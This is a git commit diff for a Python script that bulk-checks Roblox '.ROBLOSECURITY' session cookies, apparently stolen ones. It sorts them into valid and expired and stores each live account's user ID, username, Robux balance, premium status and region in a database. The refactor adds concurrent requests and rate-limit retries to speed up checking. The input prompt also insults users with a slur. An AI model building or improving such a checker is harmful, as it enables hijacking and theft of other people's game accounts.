e9bebe404fb7f3188011ab82005d6d31106029dd
Damon <damon.veil06@gmail.com>
2024-06-12 00:56:34 +1000

    Refactor
    - Speed increase
    - Ratelimit check
    - Threading

--- master.py
+++ master.py
@@ -1,69 +1,35 @@
 import os
-import requests
-from pathlib import Path
-from colorama import Fore, Style, init
-import logging
 import sqlite3
+import asyncio
+import requests
 
-IDIR = "input"
-ODIR = "output"
-DATABASE_FILE = "./data/cookies.db"
+from aiohttp import ClientSession
+from colorama import Fore, Style, init
+from pathlib import Path
 
-A = """
-Author: @hatedamon
-          \            /
-           \    __    /
-____________\.-|__|-./____________
-    + + ---\__| \/ |__/--- + +
-               \__/
-"""
+inputdir = "input"
+outputdir = "output"
+datab = "./data/cookies.db"
 
 init(autoreset=True)
 
-class ColorHandler(logging.StreamHandler):
-    def emit(self, record):
-        color = Fore.WHITE
-        if record.levelno == logging.DEBUG:
-            color = Fore.BLUE
-        elif record.levelno == logging.INFO:
-            color = Fore.GREEN
-        elif record.levelno == logging.WARNING:
-            color = Fore.YELLOW
-        elif record.levelno == logging.ERROR:
-            color = Fore.RED
-        record.msg = f"{color}{record.msg}{Style.RESET_ALL}"
-        super().emit(record)
+async def main():
+    print(Fore.WHITE + 'developed by @HATEDAMON')
 
-def configure_logging():
-    logger = logging.getLogger()
-    logger.setLevel(logging.INFO)
-
-    # remove handlers
-    for handler in logger.handlers[:]:
-        logger.removeHandler(handler)
-
-    # custom handler
-    handler = ColorHandler()
-    formatter = logging.Formatter('%(message)s')
-    handler.setFormatter(formatter)
-    logger.addHandler(handler)
-
-def main():
-    configure_logging()
-    logger = logging.getLogger()
-    print(Fore.CYAN + A)
     save_to_db = prompt_for_db_usage()
     setup_directories()
+
     if save_to_db:
         setup_database()
-    files = list(Path(IDIR).glob("*.txt"))
+
+    files = list(Path(inputdir).glob("*.txt"))
     tf = len(files)
-    logger.info(f"num found: {tf}")
-    for idx, file in enumerate(files, start=1):
-        logger.info(f"processing file {idx}/{tf}: {file.name}")
-        process(file, save_to_db)
-        logger.info(f"processed {idx}/{tf}")
-    logger.info(f"all files processed")
+
+    async with ClientSession() as session:
+        tasks = [process(session, file, save_to_db) for file in files]
+        await asyncio.gather(*tasks)
+
+    print(f"{Fore.GREEN}all files processed{Style.RESET_ALL}")
 
 def prompt_for_db_usage():
     while True:
@@ -71,17 +37,16 @@ def prompt_for_db_usage():
         if user_input in ['yes', 'no']:
             return user_input == 'yes'
         else:
-            print("god you're retarded...")
+            print("retard...")
 
 def setup_directories():
-    os.makedirs(ODIR, exist_ok=True)
-    logger = logging.getLogger()
-    logger.info(f"input dir: {IDIR}")
-    logger.info(f"output dir: {ODIR}")
+    os.makedirs(outputdir, exist_ok=True)
+    print(f"{Fore.CYAN}input dir: {inputdir}{Style.RESET_ALL}")
+    print(f"{Fore.CYAN}output dir: {outputdir}{Style.RESET_ALL}")
 
 def setup_database():
-    os.makedirs(os.path.dirname(DATABASE_FILE), exist_ok=True)
-    with sqlite3.connect(DATABASE_FILE) as conn:
+    os.makedirs(os.path.dirname(datab), exist_ok=True)
+    with sqlite3.connect(datab) as conn:
         cursor = conn.cursor()
         cursor.execute('''CREATE TABLE IF NOT EXISTS cookies (
                             id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -90,71 +55,58 @@ def setup_database():
                             robux_balance TEXT,
                             is_premium TEXT,
                             location TEXT,
-                            cookie TEXT,
+                            cookie TEXT UNIQUE,
                             status TEXT)''')
         conn.commit()
-    logger = logging.getLogger()
-    logger.info(f"db setup completed: {DATABASE_FILE}")
+    print(f"{Fore.MAGENTA}db setup completed: {datab}{Style.RESET_ALL}")
 
-def process(file_path, save_to_db):
+async def process(session, file_path, save_to_db):
     with file_path.open('r') as file:
-        for line in file:
-            cookie = line.strip()
-            if cookie:
-                validate(cookie, save_to_db)
+        tasks = [validate(session, line.strip(), save_to_db, idx) for idx, line in enumerate(file, start=1) if line.strip()]
+        await asyncio.gather(*tasks)
 
-def validate(cookie, save_to_db):
-    logger = logging.getLogger()
+async def validate(session, cookie, save_to_db, linenumber):
     try:
-        response = requests.get("https://roblox.com/login", cookies={".ROBLOSECURITY": cookie})
-        if response.status_code == 200:
-            collect_data(cookie, save_to_db)
-        else:
-            save_to_txt(cookie, "expired")
-    except requests.RequestException as e:
-        logger.error(f"er making req: {e}")
-        save_to_txt(cookie, "expired")
+        async with session.get("https://www.roblox.com/mobileapi/userinfo", cookies={".ROBLOSECURITY": cookie}) as response:
+            if response.status == 200:
+                user_data = await response.json()
+                user_data['IsPremium'] = bool(user_data.get('IsPremium', 0))
 
-def collect_data(cookie, save_to_db):
-    logger = logging.getLogger()
-    try:
-        response = requests.get("https://www.roblox.com/mobileapi/userinfo", cookies={".ROBLOSECURITY": cookie})
-        if response.status_code == 200:
-            user_data = response.json()
-            if save_to_db:
-                save_to_db_func(cookie, user_data)
+                if save_to_db:
+                    await save_to_db_func(cookie, user_data)
+                else:
+                    await save_to_txt(cookie, "valid")
+
+            elif response.status == 429:
+                print(f"{Fore.YELLOW}rate limit exceeded, retrying in 5s...{Style.RESET_ALL}")
+                await asyncio.sleep(5)
+                await validate(session, cookie, save_to_db, linenumber)
+
             else:
-                save_to_txt(cookie, "valid")
-        else:
-            save_to_txt(cookie, "expired")
-    except requests.RequestException as e:
-        logger.error(f"err collecting data: {e}")
-        save_to_txt(cookie, "expired")
+                print(f"{Fore.RED}cookie {linenumber} is invalid, next{Style.RESET_ALL}")
+                await save_to_txt(cookie, "expired")
 
-def save_to_db_func(cookie, user_data):
-    logger = logging.getLogger()
+    except Exception:
+        print(f"{Fore.RED}cookie {linenumber} is invalid, next{Style.RESET_ALL}")
+        await save_to_txt(cookie, "expired")
+
+async def save_to_db_func(cookie, user_data):
     location_response = requests.get("https://auth.roblox.com/v1/auth/metadata", cookies={".ROBLOSECURITY": cookie})
-    if location_response.status_code == 200:
-        location = location_response.headers.get("x-roblox-region", "Unknown")
-    else:
-        location = "Unknown"
+    location = location_response.headers.get("x-roblox-edge", "unknown") if location_response.status_code == 200 else "unknown"
 
-    user_id = user_data.get("UserID", "Unknown")
-    username = user_data.get("UserName", "Unknown")
-    robux_balance = user_data.get("RobuxBalance", "Unknown")
-    is_premium = user_data.get("IsPremium", "Unknown")
-
-    with sqlite3.connect(DATABASE_FILE) as conn:
+    with sqlite3.connect(datab) as conn:
         cursor = conn.cursor()
-        cursor.execute("INSERT INTO cookies (user_id, username, robux_balance, is_premium, location, cookie, status) VALUES (?, ?, ?, ?, ?, ?, ?)",
-                       (user_id, username, robux_balance, is_premium, location, cookie, "valid"))
+        cursor.execute("""
+            INSERT OR REPLACE INTO cookies (user_id, username, robux_balance, is_premium, location, cookie, status)
+            VALUES (?, ?, ?, ?, ?, ?, ?)""",
+            (user_data["UserID"], user_data["UserName"], user_data["RobuxBalance"], user_data["IsPremium"], location, cookie, "valid"))
         conn.commit()
-    logger.info(f"cookie data saved to db for user: {username}")
+    print(f"{Fore.MAGENTA}data saved to db for cookie: {user_data['UserName']}{Style.RESET_ALL}")
 
-def save_to_txt(cookie, status):
-    output_file = Path(ODIR) / f"{status}.txt"
+async def save_to_txt(cookie, status):
+    output_file = Path(outputdir) / f"{status}.txt"
     with output_file.open('a') as file:
         file.write(cookie + "\n")
 
 if __name__ == "__main__":
-    main()
+    asyncio.run(main())
